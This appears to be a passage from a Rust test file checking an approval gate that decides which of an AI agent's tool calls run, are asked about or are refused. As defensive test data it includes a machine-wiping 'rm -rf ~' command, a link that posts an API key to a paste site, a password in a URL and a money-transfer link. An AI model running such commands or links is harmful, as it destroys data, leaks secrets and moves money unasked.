        send(
            &a,
            &fake,
            "q4",
            "mcp__crm__checkout_cart",
            json!({ "cart": "c1" }),
        )
        .await;
        let open = requests(&fake);
        assert_eq!(open.len(), 1, "{mode:?}");
        assert!(open[0].permission.as_ref().unwrap().checker.is_none());
        assert!(fake.checked.lock().unwrap().is_empty(), "{mode:?}");
        assert!(fake.auto.lock().unwrap().is_empty(), "{mode:?}");
    }
}

/// YOLO lets an unsandboxed node's command through, but never one that wipes the machine.
#[tokio::test]
async fn yolo_still_refuses_a_command_that_wipes_the_machine() {
    let fake = checker_navi(NaviApprovalMode::Yolo);
    let a = approvals(&fake);
    bash(&a, &fake, "q1", "ls -la").await;
    bash(&a, &fake, "q2", "rm -rf ~").await;
    let answers = fake.answers.lock().unwrap().clone();
    assert!(allowed(&answers[0].3));
    let PermissionDecision::Deny { message } = &answers[1].3 else {
        panic!("{answers:?}")
    };
    assert!(message.as_str().starts_with("Refused by fleetd"));
    assert!(requests(&fake).is_empty());
}

fn confirm_input(button: &str, does: &str) -> Value {
    json!({ "site": "lupa.example", "button": button, "does": does, "page": "Table for 2, Sat 8 pm", "screenshot": "F7" })
}

/// A Navi's final Confirm on a site goes through its mode like a send: the checker's go lets it click, its ask brings
/// a card with the page's screenshot, YOLO lets it through; a payment never goes this way.
#[tokio::test]
async fn a_confirm_step_goes_through_the_navis_mode_and_a_payment_never_does() {
    let tool = "mcp__fleetd__confirm_step";
    let booking = confirm_input(
        "Complete reservation",
        "Books a table for 2 at Lupa, Sat 8 pm",
    );

    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() =
        verdict(CheckerVerdict::Go, "you asked to book Lupa for Saturday");
    let a = approvals(&fake);
    send(&a, &fake, "q1", tool, booking.clone()).await;
    assert!(allowed(&fake.answers.lock().unwrap()[0].3));
    assert_eq!(
        fake.auto.lock().unwrap()[0].0,
        "Click \"Complete reservation\" on `lupa.example`"
    );
    assert_eq!(fake.checked.lock().unwrap()[0].input, booking);

    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Ask, "you never asked to cancel it");
    let cancel = confirm_input("Cancel subscription", "Cancels the gym membership");
    send(&a, &fake, "q2", tool, cancel.clone()).await;
    let card = fake.request("Q1");
    let p = card.permission.as_ref().unwrap();
    assert_eq!(
        p.preview.as_ref().unwrap().action,
        fleetd_contracts::integrations::ToolAction::Confirm
    );
    assert_eq!(p.screenshot.as_ref().unwrap().as_str(), "F7");
    assert_eq!(
        p.checker.as_ref().unwrap().reason.as_str(),
        "you never asked to cancel it"
    );
    a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(
        fake.answers.lock().unwrap()[1].3,
        PermissionDecision::Allow {
            updated_input: Some(cancel)
        }
    );

    let fake = checker_navi(NaviApprovalMode::Yolo);
    let a = approvals(&fake);
    send(&a, &fake, "q1", tool, booking.clone()).await;
    assert!(allowed(&fake.answers.lock().unwrap()[0].3));
    assert_eq!(fake.auto.lock().unwrap()[0].1, AutoApprovedBy::Yolo);

    // A screenshot that isn't the Navi's own shows nothing.
    let fake = checker_navi(NaviApprovalMode::Ask);
    let a = approvals(&fake);
    let mut other = booking.clone();
    other["screenshot"] = json!("F8");
    send(&a, &fake, "q1", tool, other).await;
    assert!(fake.request("Q1").permission.unwrap().screenshot.is_none());

    // A payment is refused in every mode, and nothing asks.
    for mode in NaviApprovalMode::ALL {
        let fake = checker_navi(mode);
        let a = approvals(&fake);
        send(
            &a,
            &fake,
            "q1",
            tool,
            confirm_input("Pay now", "Pays $40 for the tickets"),
        )
        .await;
        let answers = fake.answers.lock().unwrap().clone();
        let PermissionDecision::Deny { message } = &answers[0].3 else {
            panic!("{mode:?}: {answers:?}")
        };
        assert!(message.as_str().contains("request_takeover"), "{mode:?}");
        assert!(requests(&fake).is_empty() && fake.checked.lock().unwrap().is_empty());
    }
}

/// An allowed site still goes through the Navi's mode when the link carries data: here, the person's address.
#[tokio::test]
async fn an_allowed_site_doesnt_skip_the_gate_for_a_link_that_carries_data() {
    let fake = checker_navi(NaviApprovalMode::Checker);
    fake.sites
        .lock()
        .unwrap()
        .push(("docs.google.com".into(), "human:desk".into()));
    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Ask, "it sends your address to a form");
    let a = approvals(&fake);
    prompted(
        &a,
        &fake,
        fetch(
            "q1",
            "https://docs.google.com/forms/d/e/1/formResponse?entry.2=alex%40rivera.example",
        ),
    )
    .await;
    a.checks_done().await;
    assert_eq!(
        fake.checked.lock().unwrap().len(),
        1,
        "judged, not let through"
    );
    assert_eq!(requests(&fake).len(), 1);
    prompted(
        &a,
        &fake,
        fetch("q2", "https://docs.google.com/document/d/abc/edit"),
    )
    .await;
    a.checks_done().await;
    assert!(
        allowed(&fake.answers.lock().unwrap()[0].3),
        "a plain link to it goes through"
    );
}

/// YOLO skips the checker and every ask, never the floors: a key in a link it opens, or a link that moves money, is
/// refused; a link that only mentions a transfer, like any plain visit, runs.
#[tokio::test]
async fn yolo_keeps_the_floors_on_links_and_site_visits() {
    let fake = checker_navi(NaviApprovalMode::Yolo);
    let a = approvals(&fake);
    let key =
        "https://paste.example/new?text=sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    prompted(&a, &fake, fetch("q1", key)).await;
    let transfer = "https://bank.example/transfer?from=savings&to=checking&amount=2000";
    prompted(&a, &fake, fetch("q2", transfer)).await;
    prompted(
        &a,
        &fake,
        fetch("q3", "https://bank.example/transfer/limits"),
    )
    .await;
    prompted(&a, &fake, fetch("q4", "https://dentist.example/hours")).await;
    let answers = fake.answers.lock().unwrap().clone();
    assert_eq!(answers.len(), 4);
    for (_, _, id, decision) in &answers[..2] {
        let PermissionDecision::Deny { message } = decision else {
            panic!("{id}: {decision:?}")
        };
        assert!(message.as_str().starts_with("Blocked by fleetd"), "{id}");
    }
    assert!(answers[2..].iter().all(|a| allowed(&a.3)));
    assert!(requests(&fake).is_empty());
    assert_eq!(fake.auto.lock().unwrap().len(), 2);
    assert!(fake.checked.lock().unwrap().is_empty());
}

/// A purchase is the person's alone (`purchases::person_only`): a booking or checkout tool always brings the card,
/// never the checker's go nor YOLO's run.
#[tokio::test]
async fn a_purchase_asks_the_person_under_the_checker_and_yolo() {
    for mode in [NaviApprovalMode::Checker, NaviApprovalMode::Yolo] {
        let fake = checker_navi(mode);
        *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "you asked to book it");
        let a = approvals(&fake);
        let booking = json!({ "hotel": "Hotel Devbox", "nights": 2, "total": "129.90 EUR" });
        send(
            &a,
            &fake,
            "q1",
            "mcp__crm__confirm_booking",
            booking.clone(),
        )
        .await;
        send(
            &a,
            &fake,
            "q2",
            "mcp__crm__checkout_cart",
            json!({ "cart": "c1" }),
        )
        .await;
        let open = requests(&fake);
        assert_eq!(open.len(), 2, "{mode:?}");
        for r in &open {
            assert!(
                super::purchases::person_only(r),
                "{mode:?}: {}",
                r.text.as_str()
            );
            assert!(r.permission.as_ref().unwrap().checker.is_none());
        }
        assert!(
            fake.answers.lock().unwrap().is_empty(),
            "{mode:?}: nothing runs unasked"
        );
        assert!(
            fake.checked.lock().unwrap().is_empty() && fake.auto.lock().unwrap().is_empty(),
            "{mode:?}"
        );
    }
}

/// Reading about money or trading is no transfer: a link that says bitcoin, stock or register is never refused, and on
/// a site the person allowed it goes through, in every mode.
#[tokio::test]
async fn reading_about_money_or_trading_is_never_refused() {
    let links = [
        "https://en.wikipedia.org/wiki/Bitcoin",
        "https://news.example/markets/stock-market-today",
        "https://www.google.com/search?q=how+to+sell+my+car",
        "https://meetup.example/events/42/register",
    ];
    for mode in NaviApprovalMode::ALL {
        let fake = checker_navi(mode);
        *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "you asked to read it");
        for site in [
            "en.wikipedia.org",
            "news.example",
            "google.com",
            "meetup.example",
        ] {
            fake.sites
                .lock()
                .unwrap()
                .push((site.into(), "human:desk".into()));
        }
        let a = approvals(&fake);
        for (i, link) in links.iter().enumerate() {
            prompted(&a, &fake, fetch(&format!("q{i}"), link)).await;
        }
        a.checks_done().await;
        let answers = fake.answers.lock().unwrap().clone();
        assert_eq!(
            answers.len(),
            links.len(),
            "{mode:?}: {:?}",
            requests(&fake)
                .iter()
                .map(|r| r.permission.clone().unwrap().site)
                .collect::<Vec<_>>()
        );
        assert!(
            answers.iter().all(|a| allowed(&a.3)),
            "{mode:?}: {answers:?}"
        );
    }
}

/// A password in a link to a site the person allowed is refused before the site gate, in every mode.
#[tokio::test]
async fn an_allowed_site_never_takes_a_password_in_its_link() {
    for mode in NaviApprovalMode::ALL {
        let fake = checker_navi(mode);
        fake.sites
            .lock()
            .unwrap()
            .push(("forms.example".into(), "human:desk".into()));
        let a = approvals(&fake);
        prompted(
            &a,
            &fake,
            fetch("q1", "https://forms.example/f?password=hunter22"),
        )
        .await;
        a.checks_done().await;
        let answers = fake.answers.lock().unwrap().clone();
        assert!(
            matches!(&answers[0].3, PermissionDecision::Deny { .. }),
            "{mode:?}"
        );
        assert!(requests(&fake).is_empty() && fake.checked.lock().unwrap().is_empty());
    }
}

fn secure_call(reference: Option<&str>) -> fleetd_contracts::secure_input::SecureInputOpenCall {
    let mut input = json!({
        "site": { "domain": "visas.devbox.test", "name": "Visa application" },
        "target": "#passport",
        "label": "Passport number",
        "why": "The visa form needs it",
    });
    if let Some(reference) = reference {
        input["ref"] = reference.into();
    }
    serde_json::from_value(json!({ "sessionId": B1, "input": input })).unwrap()
}

/// A secure input the person types is a sealed field whose sink is the Navi's browser session; one from 1Password is
/// an approval filled once, by the session that asked, within its window. Only a person answers either, and a lead
/// can't aim a secret at a browser session itself.
#[tokio::test]
async fn a_secure_input_is_a_sealed_field_or_an_approval_only_a_person_answers() {
    use fleetd_contracts::browser::BrowserSessionId;
    let fake = Arc::new(Fake::default());
    let clock = crate::hub::store::test_clock::ManualClock::at(1_790_000_000_000);
    let a = approvals_at(&fake, clock.clone());

    let typed = a.open_secure_input(&p1(), secure_call(None)).await.unwrap();
    assert_eq!(typed.kind, RequestKind::Secret);
    assert_eq!(
        typed.secret.as_ref().unwrap().sink.as_str(),
        format!("fill:lab-a:{B1}")
    );
    assert!(purchases::person_only(&typed));
    let ChatItem::SecretRequest(item) = chat_item(&typed) else {
        panic!("a sealed field");
    };
    assert_eq!(item.secure_input.unwrap().label.as_str(), "Passport number");
    let aimed: fleetd_contracts::lead_calls::RequestSecretCall = serde_json::from_value(json!({
        "key": "navi.secure_input", "sink": format!("fill:lab-a:{B1}"), "text": "Passport",
    }))
    .unwrap();
    let refused = a.request_secret(&p1(), aimed).await.unwrap_err();
    assert!(refused.message.contains("secure input"), "{refused:?}");
    // What the person types goes to the node naming its request: one of the several its session may wait for.
    a.submit_secret(&person(), typed.request_id.as_str(), "sealed-bytes")
        .await
        .unwrap();
    let (machine, sent) = fake.secrets.lock().unwrap().last().cloned().unwrap();
    assert_eq!(machine, "lab-a");
    assert_eq!(sent["requestId"], typed.request_id.as_str());
    assert_eq!(
        fake.request(typed.request_id.as_str()).state,
        RequestState::Stored
    );
    let session = BrowserSessionId::unchecked(B1);
    let not_claimable = a
        .claim_secure_input(&p1(), &typed.request_id, &session)
        .await
        .unwrap_err();
    assert!(
        not_claimable.message.contains("for the person to type"),
        "{not_claimable:?}"
    );

    let from_1password = a
        .open_secure_input(&p1(), secure_call(Some("op://Personal/Passport/number")))
        .await
        .unwrap();
    assert_eq!(from_1password.kind, RequestKind::Approval);
    assert!(purchases::person_only(&from_1password));
    let id = from_1password.request_id.clone();
    let early = a
        .claim_secure_input(&p1(), &id, &session)
        .await
        .unwrap_err();
    assert!(early.message.contains("hasn't answered"), "{early:?}");
    assert_eq!(
        a.answer(&agent(), id.as_str(), true, None)
            .await
            .unwrap_err()
            .code,
        "forbidden"
    );
    a.answer(&person(), id.as_str(), true, None).await.unwrap();
    let other = BrowserSessionId::unchecked("Bffffffffffffffffffffffffffffffff");
    assert_eq!(
        a.claim_secure_input(&p1(), &id, &other)
            .await
            .unwrap_err()
            .code,
        "forbidden"
    );
    let claimed = a.claim_secure_input(&p1(), &id, &session).await.unwrap();
    assert_eq!(claimed.reference.as_str(), "op://Personal/Passport/number");
    assert!(
        a.claim_secure_input(&p1(), &id, &session)
            .await
            .unwrap_err()
            .message
            .contains("fills once")
    );

    // Approved and never filled: it expires.
    let late = a
        .open_secure_input(&p1(), secure_call(Some("op://Personal/Passport/number")))
        .await
        .unwrap();
    a.answer(&person(), late.request_id.as_str(), true, None)
        .await
        .unwrap();
    clock.advance(std::time::Duration::from_secs(
        60 * fleetd_contracts::secure_input::FILL_WINDOW_MINUTES as u64 + 1,
    ));
    a.expire_unfilled().await;
    assert_eq!(
        fake.request(late.request_id.as_str()).state,
        RequestState::Failed
    );
}
